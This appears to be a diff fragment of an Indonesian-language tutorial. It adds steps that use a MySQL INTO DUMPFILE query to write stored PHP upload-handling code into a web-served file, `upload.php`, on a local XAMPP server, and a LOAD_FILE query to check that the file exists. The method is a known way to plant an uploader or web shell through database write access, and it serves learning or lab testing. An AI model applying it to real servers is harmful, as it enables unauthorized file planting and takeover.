@@ -56,3 +56,13 @@ if(isset($_POST["submit"])) {
 </body>
 </html>');
 ```
+
+## Membuat File di Disk
+Jalankan query di bawah untuk membuat file `upload.php`
+```sql
+SELECT content FROM `test_content` WHERE 1 INTO DUMPFILE "D:/xampp2/htdocs/test/upload.php"
+```
+Untuk cek apakah file sudah terbentuk, jalankan perintah
+```sql
+SELECT LOAD_FILE('D:/xampp2/htdocs/test/upload.php') AS file_exist
+```
